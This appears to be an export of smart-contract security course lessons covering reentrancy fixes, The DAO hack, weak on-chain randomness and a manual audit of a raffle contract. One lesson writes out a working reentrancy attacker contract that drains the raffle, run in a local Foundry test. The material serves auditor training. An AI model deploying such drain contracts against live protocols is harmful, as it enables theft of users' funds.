        id: b7ebb003-a608-4d31-a69c-46de78f4cb81
        type: new_lesson
        enabled: true
        title: 'Reentrancy: Mitigation'
        slug: reentrancy-mitigation
        duration: 4
        video_url: IGzSibsaeUY4WxwVZWazPQi2L9GhXkJooL3WlWpBlJQ
        raw_markdown_url: /routes/security/4-puppy-raffle/20-reentrancy-mitigation/+page.md
        markdown_content: |-
          ---
          title: Reentrancy - Mitigation
          ---

          _Follow along with this video:_

          ---

          Re-entrancy is a big deal! So, how do we fix this?

          There are a few ways, the easiest of which is adhere to the CEI pattern.

          ### CEI Pattern

          _What's a CEI pattern?_

          I'm glad you asked!

          CEI stands for Checks, Effects and Interactions and is a best practice for orders of operation.

          1. Checks - require statements, conditions
          2. Effects - this is where you update the state of the contract
          3. Interactions - any interaction with external contracts/addresses come last

          Let's look at this in the context of our `withdrawBalance` example.

          ```js
          function withdrawBalance() public {
              // Checks
                  /*None*/
              //Effects
              uint256 balance = userBalance[msg.sender];
              userBalance[msg.sender] = 0;
              //Interactions
              (bool success,) = msg.sender.call{value: balance}("");
              if (!success) {
                  revert();
              }
          }
          ```

          Our function has no checks, but simply by reordering things this way, with our effects before interactions, we're guarded against re-entrancy. We can confirm this in [**Remix**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/reentrancy/Reentrancy.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js).

          ### Remix Confirmation

          First, let's make sure we've re-ordered things in our contract.

          <img src="/security-section-4/20-reentrancy-mitigation/reentrancy-mitigation1.png" style="width: 75%; height: auto;">

          Now fund your victim contract and try calling the `attack` function with a second wallet address, as we did before.

          <img src="/security-section-4/20-reentrancy-mitigation/reentrancy-mitigation2.png" style="width: 75%; height: auto;">

          It reverts! So, what's happening here?

          <img src="/security-section-4/20-reentrancy-mitigation/reentrancy-mitigation3.png" style="width: 75%; height: auto;">

          ### Alternative Mitigation

          There is another popular way we can protect from re-entrancy and that's through a locking mechanism we could apply to this function.

          This is also very simple to implement and would look something like this:

          ```js
          bool locked = false;
          function withdrawBalance() public {
              if(locked){
                  revert;
              }
              locked = true;

              // Checks
              // Effects
              uint256 balance = userBalance[msg.sender];
              userBalance[msg.sender] = 0;
              // Interactions
              (bool success,) = msg.sender.call{value: balance}("");
              if (!success) {
                  revert();
              }
              locked = false;
          }
          ```

          This is called a `mutex lock` in computing science. By applying the above logic, we lock the function once it's called so that it can't be re-entered while locked!

          Along this line we also have the [**OpenZeppelin ReentrancyGuard**](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol) library available to us. This effectively applies locks to our functions under the hood keeping our code clean and professional by leveraging the `nonReentrant` modifier.

          ### Wrap Up

          That's it! We've learnt 3 simple ways to protect against re-entrancy vulnerabilities in our code.

          1. Following CEI - Checks, Effects, Interactions Patterns
          2. Implementing a locking mechanism to our function
          3. Leveraging existing libraries from trust sources like [**OpenZeppelin's ReentrancyGuard**](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol)

          For such an easy vulnerability to protect against, re-entrancy continues to significantly impact the Web3 ecosystem. Let's take a specific look at how in the next lesson.
        description: 'Fixing Re-Entrancy in Smart Contracts:CEI Pattern, Lock Variables & Non-Reentrant Modifier'
      -
        id: 7c86d2b3-42bb-4b17-800a-fbdc70f5e1ad
        type: new_lesson
        enabled: true
        title: 'Menace To Society'
        slug: reentrancy-menace-to-society
        duration: 5
        video_url: QuJ6BbhtDyNBqG2Su02Y100IJ4J4fiosyb9TUGFmA00Gxk
        raw_markdown_url: /routes/security/4-puppy-raffle/21-reentrancy-menace-to-society/+page.md
        markdown_content: |-
          ---
          title: Reentrancy - Menace to Society
          ---

          _Follow along with this video:_

          ---

          ### Re-entrancy a Menace

          Why am I stressing re-entrancy so much you might ask? The answer is simple.

          - We've known about it since 2016
          - It's easy enough to detect that static analyzers (like Slither) can identify them
          - Web3 is still hit by millions of dollars in re-entrancy attacks per year.

          This is so frustrating!

          There's a [**GitHub Repo**](https://github.com/pcaversaccio/reentrancy-attacks) maintained by Pascal (legend) that catalogues re-entrancy attacks which have occured. I encourage you to look through these examples and really acquire a sense of the scope of the problem.

          ### Case Study: The DAO

          [**The DAO**](https://en.wikipedia.org/wiki/The_DAO) was one of the most famous (or infamous) protocols in Web3 history. As of May 2016, its total value locked was ~14% of all ETH.

          Unfortunately, it suffered from a re-entrancy vulnerability in two of its functions.

          The first problem existed in the `splitDao` function, here's the vulnerable section and the whole contract for reference:

          ```js
          contract DAO is DAOInterface, Token, TokenCreation {
              ...
              function splitDAO(
                  uint _proposalID,
                  address _newCurator
              ) noEther onlyTokenholders returns (bool _success) {

              Transfer(msg.sender, 0, balances[msg.sender]);
              withdrawRewardFor(msg.sender); // be nice, and get his rewards
              totalSupply -= balances[msg.sender];
              balances[msg.sender] = 0;
              paidOut[msg.sender] = 0;
              return true;
              }
          }
          ```

          <details>
          <summary>Entire Contract</summary>

          ```js
          contract DAO is DAOInterface, Token, TokenCreation {
              function splitDAO(
                  uint _proposalID,
                  address _newCurator
              ) noEther onlyTokenholders returns (bool _success) {        Proposal p = proposals[_proposalID];        // Sanity check        if (now < p.votingDeadline  // has the voting deadline arrived?
                      //The request for a split expires XX days after the voting deadline
                      || now > p.votingDeadline + splitExecutionPeriod
                      // Does the new Curator address match?
                      || p.recipient != _newCurator
                      // Is it a new curator proposal?
                      || !p.newCurator
                      // Have you voted for this split?
                      || !p.votedYes[msg.sender]
                      // Did you already vote on another proposal?
                      || (blocked[msg.sender] != _proposalID && blocked[msg.sender] != 0) )  {
                      throw;
                  }        // If the new DAO doesn't exist yet, create the new DAO and store the
                  // current split data
                  if (address(p.splitData[0].newDAO) == 0) {
                      p.splitData[0].newDAO = createNewDAO(_newCurator);
                      // Call depth limit reached, etc.
                      if (address(p.splitData[0].newDAO) == 0)
                          throw;
                      // should never happen
                      if (this.balance < sumOfProposalDeposits)
                          throw;
                      p.splitData[0].splitBalance = actualBalance();
                      p.splitData[0].rewardToken = rewardToken[address(this)];
                      p.splitData[0].totalSupply = totalSupply;
                      p.proposalPassed = true;
                  }        // Move ether and assign new Tokens
                  uint fundsToBeMoved =
                      (balances[msg.sender] * p.splitData[0].splitBalance) /
                      p.splitData[0].totalSupply;
                  if (p.splitData[0].newDAO.createTokenProxy.value(fundsToBeMoved)(msg.sender) == false)
                      throw;        // Assign reward rights to new DAO
                  uint rewardTokenToBeMoved =
                      (balances[msg.sender] * p.splitData[0].rewardToken) / p.splitData[0].totalSupply;        uint paidOutToBeMoved = DAOpaidOut[address(this)] * rewardTokenToBeMoved /
                      rewardToken[address(this)];        rewardToken[address(p.splitData[0].newDAO)] += rewardTokenToBeMoved;
                  if (rewardToken[address(this)] < rewardTokenToBeMoved)
                      throw;
                  rewardToken[address(this)] -= rewardTokenToBeMoved;        DAOpaidOut[address(p.splitData[0].newDAO)] += paidOutToBeMoved;
                  if (DAOpaidOut[address(this)] < paidOutToBeMoved)
                      throw;
                  DAOpaidOut[address(this)] -= paidOutToBeMoved;        // Burn DAO Tokens
                  Transfer(msg.sender, 0, balances[msg.sender]);
                  withdrawRewardFor(msg.sender); // be nice, and get his rewards
                  totalSupply -= balances[msg.sender];
                  balances[msg.sender] = 0;
                  paidOut[msg.sender] = 0;
                  return true;
              }
          }
          ```

          </details>

          ---

          Hopefully we can spot the problem above. The DAO was making external calls before updating its state!

          This is seen again in the `withdrawRewardFor` function:

          ```js
          contract DAO is DAOInterface, Token, TokenCreation {
              ...
              function withdrawRewardFor(address _account) noEther internal
                  returns (bool _success) {
                  if ((balanceOf(_account) * rewardAccount.accumulatedInput()) / totalSupply < paidOut[_account])
                      throw;        uint reward =
                      (balanceOf(_account) * rewardAccount.accumulatedInput()) / totalSupply - paidOut[_account];
                  if (!rewardAccount.payOut(_account, reward))
                      throw;
                  paidOut[_account] += reward;
                  return true;
              }
          }
          ```

          ---

          An attack of this protocol in June 2016 resulted in the transfer of 3.8 Million Eth tokens and ultimately hardforked the Ethereum network in the recovery efforts.

          You should absolutely read more about this attack [**here**](https://medium.com/@zhongqiangc/smart-contract-reentrancy-thedao-f2da1d25180c).

          ### Wrap Up

          Clearly re-entrancy plagues us to this day. Millions of dollars are lost every year. There are even new types of re-entrancy, such as `read-only re-entrancy` (which we'll cover more later).

          The bottom line is - this is preventable.

          Let's recap everything we've learnt about this vulnerability, in the next lesson.
        description: 'DeFi reentrancy attacks: Importance of understanding past hacks for security pros; The DAO hack case study.'
      -
        id: 79da466e-ddef-4296-8fab-8c80cfcb34bf
        type: new_lesson
        enabled: true
        title: 'Reentrancy: Recap'
        slug: reentrancy-recap
        duration: 3
        video_url: ZQzGSv02kuMLvaN9imml16BaPWb00ZUxyB2ULSncc7t00I
        raw_markdown_url: /routes/security/4-puppy-raffle/22-reentrancy-recap/+page.md
        markdown_content: |-
          ---
          title: Reentrancy - Recap
          ---

          _Follow along with this video:_

          ---

          ### Recap

          At it's most minimalistic, a re-entrancy attack looks like this:

          <img src="/security-section-4/18-exploit-reentrancy/exploit-reentrancy3.png" style="width: 75%; height: auto;">

          A reentrancy attack occurs when an attacker takes advantage of the recursive calling capability of a contract. By repeatedly calling a function within a contract, the attacker can withdraw funds or manipulate contract state before the initial function call is resolved, often leading to the theft of funds or other unintended consequences.

          As a more indepth reference:

          <img src="/security-section-4/18-exploit-reentrancy/exploit-reentrancy2.png" style="width: 75%; height: auto;">

          We learnt that re-entrancy is a _very_ common attack vector and walked through how to indentify and reproduce the vulnerability both in [**Remix**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/reentrancy/Reentrancy.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js) and locally as well as how to test for them.

          <details>
          <summary>Re-entrancy Test Example</summary>

          ```js
          // SPDX-License-Identifier: MIT
          pragma solidity 0.8.20;

          import {Test, console2} from "forge-std/Test.sol";
          import {ReentrancyVictim, ReentrancyAttacker} from "../../src/reentrancy/Reentrancy.sol";

          contract ReentrancyTest is Test {
              ReentrancyVictim public victimContract;
              ReentrancyAttacker public attackerContract;

              address victimUser = makeAddr("victimUser");
              address attackerUser = makeAddr("attackerUser");

              uint256 amountToDeposited = 5 ether;
              uint256 attackerCapital = 1 ether;

              function setUp() public {
                  victimContract = new ReentrancyVictim();
                  attackerContract = new ReentrancyAttacker(victimContract);

                  vm.deal(victimUser, amountToDeposited);
                  vm.deal(attackerUser, attackerCapital);
              }

              function test_reenter() public {
                  // User deposits 5 ETH
                  vm.prank(victimUser);
                  victimContract.deposit{value: amountToDeposited}();

                  // We assert the user has their balance
                  assertEq(victimContract.userBalance(victimUser), amountToDeposited);

                  // // Normally, the user could now withdraw their money if they like
                  // vm.prank(victimUser);
                  // victimContract.withdrawBalance();

                  // But... we get attacked!
                  vm.prank(attackerUser);
                  attackerContract.attack{value: 1 ether}();

                  assertEq(victimContract.userBalance(victimUser), amountToDeposited);
                  assertEq(address(victimContract).balance, 0);

                  vm.prank(victimUser);
                  vm.expectRevert();
                  victimContract.withdrawBalance();
              }
          }
          ```

          </details>
          <br>

          Additionally, we learnt that `static analysis` tools like `Slither` can even catch this vulnerability (though not always)!

          We also covered how to safeguard against this attack in at least two ways.

          - Adhering to the CEI (Checks, Effects, Interactions) pattern, assuring we perform state changes _before_ making external calls.
          - Implenting a nonReentrant modifier like one offered by [**OpenZeppellin's ReentrancyGuard**](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol).
          - Applying a mutex lock to our function ourselves.
          <details>
          <summary>Mutex Lock Example</summary>

          ```js
          bool locked = false;
          function withdrawBalance() public {
              if(locked){
                  revert;
              }
              locked = true;

              // Checks
              // Effects
              uint256 balance = userBalance[msg.sender];
              userBalance[msg.sender] = 0;
              // Interactions
              (bool success,) = msg.sender.call{value: balance}("");
              if (!success) {
                  revert();
              }
              locked = false;
          }
          ```

          </details>
          <br>

          Lastly, we learnt how this problem still plagues us today. Through this [**repo**](https://github.com/pcaversaccio/reentrancy-attacks) managed by Pascal et al, we can see a horrifying list, 7 years long, of just this single attack vector. We also uncovered a case study in [**The DAO hack**](https://medium.com/@zhongqiangc/smart-contract-reentrancy-thedao-f2da1d25180c) and saw just how severe this issue can be.

          Armed with all of this knowledge, surely you will _never_ miss a re-entrancy attack again. Let's move onto the PoC.
        description: 'Patrick recaps reentrancy vulnerabilities and discusses prevention such as checks-effects-interactions (CEI) and non-reentrant modifiers.'
      -
        id: f8a232ac-d0a5-4f2e-b2f8-ec7dd5790aa4
        type: new_lesson
        enabled: true
        title: 'Reentrancy: PoC'
        slug: reentrancy-poc
        duration: 8
        video_url: AyeF5xrkAiYrAm4uH1id2JlumwL67Re1GpzerPTrTYQ
        raw_markdown_url: /routes/security/4-puppy-raffle/23-reentrancy-poc/+page.md
        markdown_content: |-
          ---
          title: Reentrancy - PoC
          ---

          _Follow along with this video:_

          ---

          ### Reentrancy in PuppyRaffle

          Returning to PuppyRaffle, let's look at how all we've learnt affects this protocol.

          A look again at this `refund` function and we see a classic case of reentrancy with an external call being made before updating state.

          ```js
          function refund(uint256 playerIndex) public {
              address playerAddress = players[playerIndex];
              require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
              require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

              // @Audit: Reentrancy
              payable(msg.sender).sendValue(entranceFee);

              players[playerIndex] = address(0);
              emit RaffleRefunded(playerAddress);
          }
          ```

          ### The PoC

          We can start by writing a new test in the protocol's `PuppyRaffle.t.sol` file. We'll have a bunch of players enter the raffle.

          ```js
          function test_reentrancyRefund() public {
              address[] memory players = new address[](4);
              players[0] = playerOne;
              players[1] = playerTwo;
              players[2] = playerThree;
              players[3] = playerFour;
              puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

          }
          ```

          > **Note:** There _is_ a `playersEntered` modifier we could use, included in this test suite, but we'll choose to be explicit here.

          Next we'll create our `ReentrancyAttacker` Contract.

          ```js
          contract ReentrancyAttacker {
              PuppyRaffle puppyRaffle;
              uint256 entranceFee;
              uint256 attackerIndex;

              constructor(PuppyRaffle _puppyRaffle) {
                  puppyRaffle = _puppyRaffle;
                  entranceFee = puppyRaffle.entranceFee();
              }

              function attack() public payable {
                  address[] memory players = new address[](1);
                  players[0] = address(this);
                  puppyRaffle.enterRaffle{value: entranceFee}(players);
                  attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
                  puppyRaffle.refund(attackerIndex);
              }
          }
          ```

          Once deployed, this `attack` function is going to kick off the attack. In order, we're entering the raffle, acquiring our `playerIndex`, and then refunding our `entranceFee`.

          This is going to cause our entranceFee to be sent back to our contract ... what happens then?

          ```js
          function _stealMoney() internal {
              if (address(puppyRaffle).balance >= entranceFee) {
                  puppyRaffle.refund(attackerIndex);

              }
          }

          fallback() external payable {
              _stealMoney();
          }

          receive() external payable {
              _stealMoney();
          }
          ```

          Adding these functions to our `ReentrancyAttacker` contract finishes the job. When funds are sent back to our contract, the `fallback` or `receive` functions are called which is going to trigger another `refund` call in our `_stealMoney` function, completing the loop until the `PuppyRaffle` contract is drained!

          <details>
          <summary> ReentrancyAttacker Contract </summary>

          ```js
          contract ReentrancyAttacker {
              PuppyRaffle puppyRaffle;
              uint256 entranceFee;
              uint256 attackerIndex;

              constructor(PuppyRaffle _puppyRaffle) {
                  puppyRaffle = _puppyRaffle;
                  entranceFee = puppyRaffle.entranceFee();
              }

              function attack() public payable {
                  address[] memory players = new address[](1);
                  players[0] = address(this);
                  puppyRaffle.enterRaffle{value: entranceFee}(players);
                  attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
                  puppyRaffle.refund(attackerIndex);
              }

              function _stealMoney() internal {
                  if (address(puppyRaffle).balance >= entranceFee) {
                      puppyRaffle.refund(attackerIndex);

                  }
              }
              fallback() external payable {
                  _stealMoney();
              }
              receive() external payable {
                  _stealMoney();
              }
          }
          ```

          </details>
          <br>

          Alright, let's add this logic to our test. First we'll create an instance of the attacker contract and an attacker address, funding it with 1 ether.

          ```js
          ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
          address attacker = makeAddr("attacker");
          vm.deal(attacker, 1 ether);
          ```

          Next, we'll grab some balances so we're ablee to log our changes after the attack.

          ```js
          uint256 startingAttackContractBalance = address(attackerContract).balance;
          uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;
          ```

          We finally call the attack, like so:

          ```js
          vm.prank(attacker);
          attackerContract.attack{value: entranceFee}();
          ```

          Then we'll console.log the impact:

          ```js
          console.log("attackerContract balance: ", startingAttackContractBalance);
          console.log("puppyRaffle balance: ", startingPuppyRaffleBalance);
          console.log(
            "ending attackerContract balance: ",
            address(attackerContract).balance
          );
          console.log("ending puppyRaffle balance: ", address(puppyRaffle).balance);
          ```

          <details>
          <summary>test_reentrancyRefund</summary>

          ```js
          function test_reentrancyRefund() public {
              // users entering raffle
              address[] memory players = new address[](4);
              players[0] = playerOne;
              players[1] = playerTwo;
              players[2] = playerThree;
              players[3] = playerFour;
              puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

              // create attack contract and user
              ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
              address attacker = makeAddr("attacker");
              vm.deal(attacker, 1 ether);

              // noting starting balances
              uint256 startingAttackContractBalance = address(attackerContract).balance;
              uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;

              // attack
              vm.prank(attacker);
              attackerContract.attack{value: entranceFee}();

              // impact
              console.log("attackerContract balance: ", startingAttackContractBalance);
              console.log("puppyRaffle balance: ", startingPuppyRaffleBalance);
              console.log("ending attackerContract balance: ", address(attackerContract).balance);
              console.log("ending puppyRaffle balance: ", address(puppyRaffle).balance);
          }
          ```

          </details>
          <br>

          All we need to do now is run this test with the command `forge test --mt test_reentrancyRefund -vvv` and we should receive...

          <img src="/security-section-4/23-reentrancy-poc/reentrancy-poc1.png" style="width: 75%; height: auto;">

          ### Wrap Up

          We did it! We've proven the vulnerability through our application of our PoC and we'll absolutely be submitting this as a finding - likely a `High`.

          Be very proud of what you've learnt so far, you're now armed to safeguard De-Fi against some of the most prevalent vulnerabilities in Web3.

          Let's go back to the code back and continue our recon in the next lesson.
        description: 'Identify & exploit smart contract re-entrancy vulnerability for PuppyRaffle. Demo of POC with a hypothetical attacker contract. Discuss prevention methods.'
      -
        id: 31709f46-91b8-4eb4-88bd-a14600106ae5
        type: new_lesson
        enabled: true
        title: 'Recon: Continued'
        slug: recon-continued
        duration: 5
        video_url: NhZ500cBSKSrf6ROlqMhqPtbQoOHbi6WoEe51H9C2x2I
        raw_markdown_url: /routes/security/4-puppy-raffle/24-recon-continued/+page.md
        markdown_content: |-
          ---
          title: Recon Continued
          ---

          _Follow along with this video:_

          ---

          Let's continue with our manual review of PuppyRaffle. So far we've gone through

          - enterRaffle - where we uncovered a DoS vulnerability
          - refund - we discovered is vulnerable to reentrancy
          - getActivePlayerIndex - we found an edge case where players at index 0 aren't sure if they've entered the raffle!

          Walking through the code, we're moving onto the `selectWinner` function. This is a big one, we'll have a lot to go over.

          ```js
          function selectWinner() external {
              require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
              require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
              uint256 winnerIndex =
                  uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
              address winner = players[winnerIndex];
              uint256 totalAmountCollected = players.length * entranceFee;
              uint256 prizePool = (totalAmountCollected * 80) / 100;
              uint256 fee = (totalAmountCollected * 20) / 100;
              totalFees = totalFees + uint64(fee);

              uint256 tokenId = totalSupply();

              // We use a different RNG calculate from the winnerIndex to determine rarity
              uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
              if (rarity <= COMMON_RARITY) {
                  tokenIdToRarity[tokenId] = COMMON_RARITY;
              } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
                  tokenIdToRarity[tokenId] = RARE_RARITY;
              } else {
                  tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
              }

              delete players;
              raffleStartTime = block.timestamp;
              previousWinner = winner;
              (bool success,) = winner.call{value: prizePool}("");
              require(success, "PuppyRaffle: Failed to send prize pool to winner");
              _safeMint(winner, tokenId);
          }
          ```

          The function's NatSpec makes it's purpose quite clear.

          ```js
          /// @notice this function will select a winner and mint a puppy
          /// @notice there must be at least 4 players, and the duration has occurred
          /// @notice the previous winner is stored in the previousWinner variable
          /// @dev we use a hash of on-chain data to generate the random numbers
          /// @dev we reset the active players array after the winner is selected
          /// @dev we send 80% of the funds to the winner, the other 20% goes to the feeAddress
          ```

          We can see the first thing this function is doing is performing some checks. Given what we recently learnt a reasonable question to ask might be _Is this following CEI?_

          Well, in this instance the only thing happening after our external call is `_safeMint`. We're not really sure what this is yet, so we may come back to it.

          ```js
            (bool success,) = winner.call{value: prizePool}("");
            require(success, "PuppyRaffle: Failed to send prize pool to winner");
            _safeMint(winner, tokenId);
          ```

          One of our checks requires the `raffleDuration` to have passed, verifying this variable is set properly would be another thing we would want to check. In this case the `raffleDuration` is set in our constructor, the `raffleStartTime` is set during the instant of deployment. Looks good.

          ```js
          require(block.timestamp >=
            raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
          ```

          I encourage you to write these thoughts down in your `notes.md` file and actually write in-line notes to keep them organized. Being able to reference these thoughts during our write ups and later in the review is incredibly valuable to the proceess.

          ```js
          // @Audit: Does this follow CEI?
          // @Audit: Are the duration and time being set correctly?
          // @Audit: What is _safeMint doing after our external call?
          ```

          It's important to note the `selectWinner` function is external, so anyone can call it. The checks in this function will be really important, but they do look good.

          Moving on, the next this thing function is doing is defining a `winnerIndex`.

          ```js
          uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
          address winner = players[winnerIndex];
          ```

          It seems our function is using a pseudo-random number, modded by the player's array to choose our winning index. It then assigns the player at that index in the array to our `winner` variable.

          This winner variable is used further in the function to distribute the `prizePool` as well as mint the winning NFT.

          ```js
          (bool success,) = winner.call{value: prizePool}("");
          require(success, "PuppyRaffle: Failed to send prize pool to winner");
          _safeMint(winner, tokenId);
          ```

          It's important that this selection is fair and truly random or this could be exploited by malicious actors fairly easily. My alarm bells are going off and I'm seeing a lot of red flags.

          ### Wrap Up

          Having gone through the `selectWinner` function, we now have a better understanding of this process and how it's controlleed.

          The function can't be called until the `raffleDuration` has passed and there are at least 4 people entered. Once `selectWinner` is called and passes checks, it uses a pseudo-random method to determine a winner of the raffle and then transfers the `prizePool` and mints them an NFT.

          The question becomes:

          ```js
          // @Audit: Is this selection process fair/truly random?
          ```

          Let's look more closely in the next lesson!

          > **Challenge:** There is a **massive** bug with refund + selectWinner that we _don't_ go over here. I challenge you to find it!
        description: "Smart contract codebase analysis, focusing on PuppyRaffle's selectWinner function. Checking timestamp, players, raffle status, winner calculation concern."
      -
        id: 6b574a27-6e1f-4aa4-a421-8a51b18cdb90
        type: new_lesson
        enabled: true
        title: 'Exploit: Weak randomness'
        slug: exploit-weak-randomness
        duration: 4
        video_url: Ej3Cgk3xfWXpqa8P5WTCNBFDCo7vVRk01wkjViEzUkfI
        raw_markdown_url: /routes/security/4-puppy-raffle/25-exploit-weak-randomness/+page.md
        markdown_content: |-
          ---
          title: Exploit - Weak Randomness
          ---

          _Follow along with this video:_

          ---

          ### Weak Randomness Overview

          This will be a quick overview, but there are a view ways that Weak Randomness can cause issues.

          Let's actually take a moment to go back to `Slither` because, if you can believe it, `Slither` will actually catch this for us.

          ```bash
          slither .
          ```

          Running slither as above we can see it's output contains the following:

          <img src="/security-section-4/25-exploit-weak-randomness/weak-randomness1.png" style="width: 75%; height: auto;">

          So what is this detector telling us - that `PuppyRaffle.sol` is using weak PRNG or Pseudo Random Number Generation. We can navigate to the [**link provided**](https://github.com/crytic/slither/wiki/Detector-Documentation#weak-PRNG) for more information and a simplified example of this vulnerability.

          <img src="/security-section-4/25-exploit-weak-randomness/weak-randomness2.png" style="width: 75%; height: auto;">

          Beyond what's outlined here as a concern - that miners can influence global variables favorable - there's a lot more _weirdness_ that goes into random numbers on-chain.

          If you've seen any of my other content, you know that Chainlink VRF is a solution for this problem, and I encourage you to check out the [**documentation**](https://docs.chain.link/vrf) for some additional learnings.

          ### Remix Examples

          Return to our [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) repo and we've included a link to a [**Remix example**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/weak-randomness/WeakRandomness.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js) of this vulnerability.

          > This contract is available for local testing as well [**here**](https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/weak-randomness/WeakRandomness.sol).

          Looking at the `Remix` example, we can see it's doing something very similar to what `PuppyRaffle` is doing

          ```js
          uint256 randomNumber = uint256(keccak256(abi.encodePacked(msg.sender, block.prevrandao, block.timestamp)));
          ```

          In this declaration we're taking 3 variables:

          - msg.sender
          - block.prevrandao
          - block.timestamp

          We're hashing these variables and casting the result as a uint256. The problem exists in that the 3 variables we're deriving our number from are able to be influenced or anticipated such that we can predict what the random number will be.

          The test set up in [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) may look a little silly, but what's trying to be conveyed is that generating the same random number in a single block is another example of how this vulnerability can be exploited.

          ```js
          // For this test, a user could just deploy a contract that guesses the random number...
          // by calling the random number in the same block!!
          function test_guessRandomNumber() public {
              uint256 randomNumber = weakRandomness.getRandomNumber();

              assertEq(randomNumber, weakRandomness.getRandomNumber());
          }
          ```

          ### Wrap Up

          In short - the blockchain is deterministic. Using on-chain variables and pseudo random number generation leaves a protocol open to exploits whereby an attacker can predict or manipulate the 'random' value.

          There multiple ways that weak randomness can be exploited, and we'll be going through them in the next lesson!
        description: "Dive into PuppyRaffle's weak randomness. Patrick emphasizes use of secure sources like Chainlink VRF."
      -
        id: 553ec8a3-8e89-4408-b1a0-df917a61e099
        type: new_lesson
        enabled: true
        title: 'Weak randomness: Multiple issues'
        slug: weak-randomness-multiple-issues
        duration: 4
        video_url: K2A00fSWWtRpOFj32H900qMwvS779kZXOAl00GFThIVu5o
        raw_markdown_url: /routes/security/4-puppy-raffle/26-weak-randomness-multiple-issues/+page.md
        markdown_content: |-
          ---
          title: Weak Randomness - Multiple Issues
          ---

          _Follow along with this video:_

          ---

          ### Weak Randomness Breakdown

          Let's look at a few ways that randomness, as we've seen in `PuppyRaffle` and our [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) examples, can be manipulated.

          <img src="/security-section-4/26-weak-randomness-issues/randomness-issues1.png" style="width: 75%; height: auto;">

          ### block.timestamp

          Relying on block.timestamp is risky for a few reasons as node validators/miners have privileges that may give them unfair advantages.

          The validator selected for a transaction has the power to:

          - Hold or delay the transaction until a more favorable time
          - Reject the transaction because the timestamp isn't favorable

          Timestamp manipulation has become less of an issue on Ethereum, since the merge, but it isn't perfect. Other chains, such as Arbitrum can be vulnerable to several seconds of slippage putting randomness based on `block.timestamp` at risk.

          ### block.prevrandao

          `block.prevrandao` was introduced to replace `block.difficulty` when the merge happened. This is a system to choose random validators.

          The security issues using this value for randomness are well enough known that many of them are outlined in the [**EIP-4399**](https://eips.ethereum.org/EIPS/eip-4399) documentation already.

          The security considerations outlined here include:

          **Biasability:** The beacon chain RANDAO implementation gives every block proposer 1 bit of influence power per slot. Proposer may deliberately refuse to propose a block on the opportunity cost of proposer and transaction fees to prevent beacon chain randomness (a RANDAO mix) from being updated in a particular slot.

          **Predictability:** Obviously, historical randomness provided by any decentralized oracle is 100% predictable. On the contrary, the randomness that is revealed in the future is predictable up to a limited extent.

          ### msg.sender

          Any field controlled by a caller can be manipulated. If randomness is generated from this field, it gives the caller control over the outcome.

          By using msg.sender we allow the caller the ability to mine for addresses until a favorable one is found, breaking the randomness of the system.

          ### Wrap Up

          This should all make sense. The blockchain is a deterministic system, any number we derive from it, is by definition going to be deterministic.

          We've touched on a few ways this vulnerability can be exploited, in the next lesson we'll investigate a case study that should illustrate the potential impact of a weakness like this.

          Meanwhile, I encourage you to experiment further with how the vulnerability works within our [**Remix**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/weak-randomness/WeakRandomness.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js) and [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) examples.
        description: 'Blockchain timestamps, previous block hashes, and transaction senders are unsuitable for secure random number generation. Use more reliable methods instead.'
      -
        id: a783af65-794e-42cd-b1e3-74c9ce450915
        type: new_lesson
        enabled: true
        title: 'Case Study: Weak Randomness'
        slug: weak-randomness-case-study
        duration: 7
        video_url: xlTTGNN02YD3RRQDZBOAo00gTiZHjzxMubn5S02n71PTvw
        raw_markdown_url: /routes/security/4-puppy-raffle/27-weak-randomness-case-study/+page.md
        markdown_content: |-
          ---
          title: Weak Randomness - Case Study
          ---

          _Follow along with this video:_

          ---

          ### Intro to Meebits and Andy Li

          Let's look into a case study that involves the exploit of an NFT project, Meebits, which occurred in 2021. This analysis will shed light on a real-world example of how weak randomness was exploited, resulting in a substantial loss of nearly a million dollars for the protocol.

          We extend our appreciation to [**Andy Li**](https://twitter.com/andyfeili) from [**Sigma Prime**](https://sigmaprime.io/) who walks us through the details of this attack.

          _Information in this post is graciously provided by Andy_

